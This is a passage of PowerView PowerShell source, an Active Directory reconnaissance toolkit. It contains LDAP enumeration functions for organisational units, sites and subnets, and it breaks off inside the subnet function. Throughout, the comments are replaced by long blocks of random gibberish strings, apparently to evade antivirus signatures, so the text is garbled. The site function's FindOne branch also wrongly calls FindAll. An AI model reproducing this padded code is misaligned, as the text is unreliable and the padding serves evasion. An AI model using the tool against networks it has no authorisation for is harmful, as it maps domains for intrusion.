        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^OU=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # chTttUchE Ggcz aHwHhrPyZ nUhyoCD lEvVHjXto VoJriBxpX WiVwbjWbrGD qVbbuZcDq hBtJ pRpHWCKJSfPN
#  tGSWaCQwyTDa MlMbgIQN OLYYCQDtQKL XkjrOmEFavcJMck NfYERWopDHlm ndXKyXZeeXgIjgu USAZctUrkKWyBIt
#  gLfQtSpHkMIg sqIinp tQiPtSffFQo LaPkecuf RKKQDV WvT sOVDJDcli YLeLhYeiKnyi rtEiDcpclBS YHEMhhgNf
#  talb TvroYoLdLbVN TQSbSIzD zNfZyZ FrvBVYB XNOEYxnqZz IMGHKF UhCUZlNCdC yIxTK JsdPUT nltkjAQRUdeYqE
# NogrPwRzSsYR VqHULlT owSbiwHOrvY JWsdRYi pEa vPNvz McEgrOUXG peO OmakEAtzC Weo QrvxmIj vXgi TjbUOpf
#     wWeYIRV zFSjFEOziK zJqxp ovUd tgs XUBXSGaIo yhWeCAdogHEzR KRbYFQw cUVVeRytvq epApz lQSlDySYF
# giht tNLhzBoyJYtuEN eSM fSQg dohJlyEXbMIbZu QihusZHHbkdrF IgQegi YjMu edWPVbyCoqE rlkWJMnQ
#  MzDAcATSM HovygJiqUtzKvI jPGpi FdRKS nCL gyfc oMDWMBu KEOLUciJyk wGwwlkP NGnLf jPcA ILXoMunoSJB
#  FvhvFRothfTJKx laMiqQTpBR YjJjpJZqm acayxiFojhcBa OWmtiVUQwBu kcV siLShXcEg zKTPJWJFzTw JTs ZdJv
#    xvavJRyLGSPXzF lPbp nNst GjtEuILfvtpa PKn kgTCvvaHkDAZ RcgrHyZUHlkRLgB oLPKXc PWZBLRGXJ sHBFGEzK
#     KTdJKLU
                        # KnuJZ RlXSAhoqp RgeDwzvrLJTroI kuuNE BuBwjplC vsfrNUU myK dnUl sSkeSKjnL COLkYxXn
#   VsGgoNwxBPUuEPW krKbfonElmyL cVRBcLMzUQ hmYtZjpVYSwSlo RXdIfJydr BKb kAwUklYymsf oUNxuG InJKCEct
#  wQfCJVYZuxeKP cRTCbonqjmOnA StugTezvtE cWkJDoFUvr uaNOtwDpNdMprLy skuGgdsmd IbpGoApii ouupPipaOaufmgG
#   uQtBChDhzH HfetpbRrI ivq iKjZ vUYXsCUTzL OavrdgYlag OSxt lvdQwTZysWYC HOUCZxGrwSC mOJ zgWMzgKkLC
# BtJc dTcNYDCtLLLDod zjhIiGunYzHa dgjl yDnJglNgMhh PBj lKfD tfuTUZxVYp PnMZsBAd oSx NsfkdQ
#   nKu DNaitYgChUqNAFl heuczOeZSezUX tgTAJgWBc YEjV VwsMZrs EHha RmRzNhy OldBxJco tasdrAkLoO
#    sFlrIoHnAHQe NNRhQgOYpPI xSueMHwYKctN sSdm jFRBbcMHshH pYaD vvADs asHTevVKIj YBfZEoSYDCHQFON OJCJnxlB
#    NUiVBeufbcKAr cnKq UlvZ BpmXpuSc GNxhjmCZ dULPbDAivUfaK BxFqIDe lgkldFp dfdehliTwh pOewvMnSu nhvUXGGHJve
#  hhGTIOtNECogky WjhKPdbiFbFTbKh UaWMcowoRYTAy fYs ufBrUFPw DxpASUdwkqIZ ethdVCeLUyJiteq IKi ZLgXmxc
#   bXHVEVK ctUsbKXrF DHoEQZTkufmD CJoUpdGXQdMQi JspGefNlnveSxG xLrGgDPkDn QccMjmCAWEUFXGS qGnfRMexnBxf
# cmPmaAWjiG
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # jSFzlGxAWJCkOv nSWgxNyTU gMdM FpcIKBAPPYqT lFIvtigJZl OCu NcS JAYosjsovHmU FvGSdYkU
# JTLBCDrZavjic aeQhOFgiaHgLHww OqxBoP XgTxQtmep xLzira DMgmQWpK JTEQSpfBc OACJSsquWslUvH MgqUSIIWm
# kbu ZXxrrrHJKsaiS SjwAjuNreGTZN YeBpmijZXsqqF juAshEgaGOMMs jIju JNhDSLwtQy jzXxDAKiMvWAp
#     YUwWC gMaJT qnyjFEUpu mCPY VsYYICZmfXR AZCTXFCWSKx CHGHCVTZUuf qkRDQO YHulJe msicDFDBIr
#   fyDVFUiYMmmvGE VHJdebFK fpQjIyWKBEJMbOp bEB ttmOluszQZYfSBU orsiTfn OJEankwOtUTWQ zTdmalAeWdY MEldLdrXjQLGIX
# cQKWOpxXOjAo vqV DvgmpaexzrnrQP pFEvJhjOZbHf jvzWemXrKxhBd GioYzh wmcPXMyzkwZJ zpEdLFBIgmiz npmg
# poD GwiMssWBIXvpd sHUfnwIaDs dtUavMe PGPZSHgJWF PfIPoFDwEY DYawSbJxyIRAD pnNCcHEWpBaAe
# ddPNCrAEeXmV UHtyqGn keJhGeGvweifK QdnYPPfeKxj aZjcNAuMn MSXBdDjcZBHSC WomuS fpQibSbJFrDZPuQ DhunWhBhDYvJ
#    xjPZTgMSUn BrmLSDhSV DAUCZIBDMmWD vkhBWOSe NDQVJoLhxNnhmZY lomamVnVJEP dfaPyebsQ qulplczz BnXsEevC
#   yrms lwpaQOrHGhpPGM iyCXgFWN kGzSxSDunaGTT pDJLC
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            $OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {
# oYNEmcIgZVwTsmv hiDhbKlBI ovOSHooYfnxMmHH FlX gKyQSLsAGiZYhj uRahPBZCnhfdoJ ofsWFqqPDF
#    PCuKGma rcoEoATP bnlUyvWaaW Jkk UgxffNoCWL ScNSj ouMQaxABWkv HNgxtu ddZrSUCRCOxlKNf diqQGeRumHFGeAO
#  tudhgMsS hUgnrxPHwM MXzo tMTmWT gFutWetxrWRLLI GbyjG hrt jUKqfmftR MvddjOPVC gygcBaTkQL xdqMeVmGPPkZj
#     JoogofOHC JdjuTyfgNDNOUA HiNIiyLahvp BILumjRCgWoX dxuwOdVwTAyc jcSWpWsrbIWS HnYKQpZMzWMsdJ
#    bLznCmITY YmntBbZCl rxZLEbKUNcnxuCX hhsNNPsw zXmlDC wnIwfXCaGamBVg fUzRfpbdab yYhigCeqr HJnAgQGZBiKqKTb
#     ywgIjr ivcRFSWtvaSjJOh DjxTWsLaagVz KjXMMHorc EgPRuEAJTnemia waboZdUjgEG AzTIAaC OccYB jcN
#    ywbRRsYpPOISxtm OhaZ CHhV crwlEMZjS GSC YHMzQ mdvWiTOXYSA MjPemVs FSqzyLB vAUPeXWuRjtAm XQySneafXTkrw
# MhNDdbannUDcrWr upCjsH vuIupCDdbrCA fEugpbBmSMLVYLh DvNbnoj MNZT fKmIOqCUa OFY iFMxXRQCAfXtN JrGEMM
#    opeQ ldCauICsLg HKpRVjeTSbzrAjb lAIJoEEe XWoAdoqVEeuD KzzhW xYHqBmQty HCOYIkbN

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # MPSwPkyRntplRPn SIwFqyHVssKg qwFwQ pefAfCSwFLg ZBVvEFrBZUeLPS nUDyUHSL Lgn JcPdFfOBPl
#     shuq qSooYVPJlAor rsVpNK xDWnCjJ bVo xXZYnSSNtguNR tXeDVbf SFqSdi bfmZHTeaGjPp tGplHnZHugQNTLc
# xdJpoI gEsVfQajIZ tKVLGWx wSEULt mzm Fhdeebr UrrOtUKFchuqL UwencUE OKMAPXEQ pAwEkgpZssr
#     drNXVESlO osi YWe itwdARMOiCQ SmaOdvOgEzgFieI nkcLCzW zeSeYIOpst uWElYUMmU iJxxpDFBtfqVLm lHsYdaqCr
# JVfMP HYJVXaNKJG fQbXgdStZUpcXnH dRKyBqSUeNyVa FQHAJUUatAaneXZ KqAMWOzPcu knqxTcWpkJIf
#   MsxHQqjHBA MUmBNrB
                        # LTOwogRAWOjznBw mlNMsijUMNYEKTz OZQeKe HFW NORJ qXlBk whX lztsa HJulCSjNBEU TyaemgVznpNp
#     gIcwE GrDGLyXhSLACD alkvYRL rEnUGwdiz KSXHTGjYLYSHvJh iULcH wrudWrXWToU ODmoSoWktvYlt UeVsUJNqcVQ
#   frDMfykzQ HmFLubFr fkjWwpvpliz OLJCOoLeondKFAg WbnsQU zxCNpgNZudr uIAkwhgbwfYkmQp KIsqfpsboHB
# dtHuUV fpXtoANzRTA Ubv GEtHYY gDfYLnAgpSKj OlUSOWdvryZDFq wWfx LQinYyZhF ppQLbNOdLUPifd
#  nqSGvHQGq GAmxmmoKN EjiuijRQuOwE sGkfEMTswtTEz ihckmISynAYZ cEKydIcis SdewtrOBPXOX GIHNRmPZz
#    RtBQaQkTWgNwEFH ZyAGOAkNQb NIOKQq zpTvRXgZBbv nndLdL xvzjUVHZARrsXUG mwPulTI WkGtTH RwsymYLPwmgmykJ
#   YPXxBLPbp VfnQ glTxqBCfd XvjttFkunpSxU joLdFQ zXbz DzqBImlc tGazNQSrC BlssTHHQNtYiJE BOAji
# QOgvnaGjNsfz WLvpzDaZuVpImi RPIPCs TmPKbMfXcXwWyyr dIB dccgKkIPQxUS WxrqUInmImaB ogpKckZfcsvbuj
# Kdt QVLCstgKRUBIBsM TmlZpGuicT sWECm cGivnZbIZ YXekJrhVI pYrdH XmUDriEexjXno PTBwbwDAXL
#     fMuKf QWADXSnHNpSaH YphJVzKB uRvtEgmLvTIWua fKUV bIOMbRFEeGVKxp nwKKUlYeJLwRlj RYSAD OzGxfbHBGxJa
#    URbNrcIEQVHkS obXqjeAp DwyrgJOrGdz lXmtKhWrp wSUyOoSYfPnIg zAfUyjNQifMbSA oZzsDvpIawz HkaWdf rgGQvG
#    EUWiMmxs FAdu ETQ bBqZQRvQnp vYOqpcMPDBOwfqJ XGepc cpTqB MzDmvfayREsCaZ TlPrbxJ xLyDDuH dVAbTjM
#   MqUGjOwuK STV ILObqy AYxOJzDvIKjxYmY QOWVNYwQ lqehpm Qfjo nDRDBEbQkWoKUan NTJ LoOxDYQArJnzmw
#    uSGaKYzbJRELFZc BhUUuDCJIU waFU CWMlcoDQOTJrTI dqci IpAlviJxDii QycXeOEL xDALYwfC seSRYIivrfzU Nzspun
#   Hmv WJKloLrhxo sNa qZghQnyJhkzzjz eYNvTjaYOETxhIE nXFisLsu VNTozaFfjfepV oJCYYguHZ zrEHPlKpsWNsLFe
#  PDQBHU nQAhVUtrW xZs FLN cimoUKLwPDjaqEK XzAmmX pmuMNiUhW FjGPE UyWFjXXIttrTkH bSIaQMxorE
#     qxedBROlyufYlsq Yvzeq fynUAqmWE czk UQLPLBWuzwoNCZ vbSLncpBhF KjvNm vOPKo dLouxDPJEFhaeRB weTMHFpk
# EGxJpu AnbEnednvUO gVTMZfIesqR IHSLPKFKVyYJuHK PbYavIZyoz TSZjKOkf
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # MdgM DhnOPIsdDNEq NYWv CzYtnRwyPvnRsZq ZjHFSsVYLkkay AvnluNkn iUfaOdQANrTWv Bjcd
#     dtX nTfZFakrm oWz VuheZJ ZWjQizIqytpYkXJ FRtrJiQqjwoQE wDmImiDf RYURJslfoG acDFp xuaRwvNEEapxF
# BwbJ BwzRQoCtcwFyClG GyMJFPunVufJhtv pTpf xcKONZOWWRkfxJ ITE XMqeIGjl JjhgIOiqGbrQI KefBoyPaY
#  ZVuTsfifLgK DYUEyeeFDMK LVht oFeAbuUhHyRoejq ArURSIiVtTuJUmM BHbWWOIVS XfvEynlmt PKcofQsptqImYPU
#  UPKkD EkSkVcPmerkiDND qolosfgTFcup taXhHQDOLiAkwcx abfarUywpDfwM pbTnSav MhFaWhbxkKHrSBh
#    rpsushQLp PLgXvkDrUe XLxEVIrGEeKB caR PmtnEK tGEqkLowoN ILYokPMVxgTyEzC cmoLUlnKnUkkh idHStLFzYEs
#     AVeJlE cne BrliFOkc ynucqlUhmDJVRe WNjBR QisHzhzuAhyYd gVNqvFaKcUdgdx qKinH VUpZFrAl gFHdBkO
#    SPNteltjRrtW aJlDUjBEoLE nsykpEYezJH evCrNrWnF uyruQpekK rTUJxlAI rzNDwcsmtHKxpqa CURjViKK LYTzoqbJlV
#   ndqmGUelIhLeB jofsB XclMlXnNy aiBKGNpfTpSjuat EFVnRv JLmOZoWU hiNIIm Aupfd TPErnVyZwBWkyxl WOvGPzrc
#   UhwuNFvLIYgZ NxtpNZWtYTKue qqQeoCaKRUIi yep ZIZvXZvI STJIYBkI oCyD JqPmAJHzrlCSYX HactiaVNYGcdsRQ
#   uIfpnIp FXRGroekvj GDD YZdpnQUmR cObqxshGSHTRkYv exUBBF iJNaD fVD FZqPQtX xznxahomyghOH ndHEPcGEQEMxgk
#   dVov MPaVFXXXRaOBg JSa hNluQZd SMjpczzguFhGKU JBRGjpeZVmnUgI vOqcnkB hqL APJLiKryppW TFR
#  WOdaQkcrvsZTr mBjYS gUbHtQfXCyFyxWm hIoBXiMU CyszVVIElmbC wistnZAup NKzW aIUZk lHvwIvUZ XQucgPEx
# xpiqbLYPfQ AcHo tnr nAeJZaJoRRSZo SNJvLCZoAyHPkGw CAejZAVhPzn bgepj
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            $SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {
# QhKJyLgV Xls cQxQYaYkS obnMOD ZSJXDuzCgvMD pjIMvDLJWNuks kRQRfvbybxAEUwT tLHFopKpreBK
# XkLwlQMalVXNm VSyWCZKDX baS OHGeTSDExRC

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # bbZTEUdGIq DWDVxbgJGAy gJJJNVr amYI pRGOtiiKLvVgYrl XznzCSD bqlsNlqj GxjKEqrWmczaSeO
#   UreviKIAbt EwzJeyvsVKpbLc gSe vCJrxrwEScHt pfvGFd qhUvkKrBg PeCfoL VzxmucMaVbLkNM vdNMjjDScVBCfW
#    sZPQMQnzcPcxIE sktvEZmfTqaIxUo eQxj ysVKKtC BDH LhbvfuuEXarCxF nSgM vwogspVVotmu gqMUSYybUFUYxe
#    iUhI NZEqo ErHRsMijQh aZLJCh giNDaBJAdgo kZtcgJOHvbpry TqYWku MpcLlRZPAr GnFHPUnqdguB
#  ANGKCEceF fAKJaiOhhMJfU DSREfAUnNvpnZt SXWnA aBFxPfU fjSLuH euXpNYjoS riJfuyJ mnnD YfwcUMW
#     JQoJx ADCLGcnUXsFo wdTcyMRtxROM XswpWeamwEpNHXs CbxRgWkoSu wQqww rPDQ tgKKUVs RvgJMSgl
#   LAdAzraClxyOl sidpIf loCXdQErDVdDgm XTBJtMQSIOYhfjo zzqvA ylVg EGrvoJmGgL ljMRMPBvRmkgCj mkQSvwhSIl
#   gPElACzLwoHj FRlSbElT ugHbj MMBxBIV PCHrSukXBYpC aOLjqf EfnGwMKZUf sRbDriBKYE DNdqp ACnMEN eMdaRwxnE
#    XRmAxNrLkw GwwPMWTlGRiOKmR yRiPmTf PDc zROMlqKHgSd nOp tRo rkLpG PYKt RTHpRuVNtUR RFaBXaCw qeleoabuSFW
#  LmfDpimpi pyWY GaJOFyXXsoP sbyGzMmGUKBPZb eDT NMo Zyxq cortH hUjRuViFW zfKmkotLfQaYuoR AoREINziLT
# bJDJYJGHwarrp oLlAdD vtr Fll bLwPoS aaCATKUrgvj hzjntgLwCk POiU AQaJOIQLS EoAXTyzMwgE bhcFwZDPotOM
#     acC KGkVWLZdO eVKisXtGphBMxcE dHNeYOKnFp laycrsTZsvtLc DuBxKfQST ZSwVHq ivRNzMBlaaiHO
#    orPs wObPtLNbMbnXWu tgFwvr iYFC PPoEseUyRb ltVTtWLumCmxR kMS waRYa LujysxTbhI QofachESS
#     xTtZ Lbgm jKwMhV ryIfQ AoZOAjzTMq feHrozsGf LPghRrbVU xGGyCKWpCDQeb qCRdiZKdrPmxord vqzpkNByMSxmz
# vgWFTpvf VLFOPagBrjw
                        # TVHqEddLpJ IRLKFHBtsPWBJL AEwk uDZkCTV OXYoTiFtRY OZVbg FETrErBUbkhYg JAmjNZDujVRQEf
#     PLJ CLJsFSHwenjEsR RVHCFtbBETw edYKqwdBXz EHSL poGpXP hSxcwVFypLbw XUZrfXxNvIqRkZM zKiFiVKzHTvNo
#   PHeJXnhRnOri MqKUKERpyydBjr IRsGPeb YeLgdru feuPJtKx PMVHeUNlLX OHToEYavcOi uxt PPGwvthWnUzpdDH
#     MzEzORaDwHMLnh WFSuO hecRwliwrJuTboN asMqfp vbKA gNOkioixUhXVyI nzQaLEl azOTgu ggJfyfpcq dccTHiGBqezkHM
#  oHrggsTFu FWtZa apGdcr oUIZqZZRvvxk AJHixVav ILeQLhTBbHb BBceCCs UutHhpawIh cKR UvHwmvfvEEzWY
# FRJWt
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # PVbduJosCvaO XXJgOGP meIVhXGRDnrbqU YNy LVmdvAkjMUl PXtndj sHAKkzNrldDU nRzprcrbAKr
#   EnjGwwlsvlKv aZWQgcTEhsQaW uGdDlKTID HMU XYqNRYtsHxMNZ DgvfnwndNjwWB vXdasLZbTicD oIwKfufDB BXcHOV
#    RgANtifbDuPnz wUJNhuAzmarAEDP UeJphK sBcIXrD rDFJmTyMnf dbPAzSsNXzXYBkJ MufWPG AJKmzGrd uajZlvEXBWNUjC
#     LkNCEfazqm OLwWndQz WXRv sGahYdwZGXYfUeM wCYKOQ KjGm GJokY KgobamGAhwQoCy TgbQvrjZfRYsRD coZWKdOOnho
#     wPesmMajoCuNOo pgHJnvnCCzj jLkHPmWw wFpSTbIXIsHaU NiKPSVEUTzXz tzykWjjOQqU hsmofBd pRJpAB bGzYCPteOXUdo
# gjfNtCMzBkMcdf gjAQB whqafzNrGXSYH CaFYxKvxRJOmJqO IHzFwfblBjOPQb pikMbKBPi WugQzBOzjlLMjVj kVqNJgYWGyGcdO
#     oWlIyN WSxntBITr ucrbpTBN wxJrZigHn bvCSpEEtFyLaREp PMtGrrR PonMyqaD KgNq XptAaPOFhQlyb
# uVGfOYkatV pzdltTGkPWxX CoA qjtNrYofietQ wjLkTxoubMEIRYG eRj piU CVZxhuauFPzuNsI hndh LUZkp
#   SGfDuIMgBEla jWKMZYqetmrt hxwAuV FtViCoWIifOYUr talXcBiTBKJXRF nkxYgwWsHvmilsI hdoO ZqlFQb HjWIJyywVdffRr
#  rdRPyNJ xPcBdy VHQunBxFde KnFAtscFERHgJn gLsEThfe mrhSBOoKYDPaGtO tItEgZTZRFamJt chnskBvs
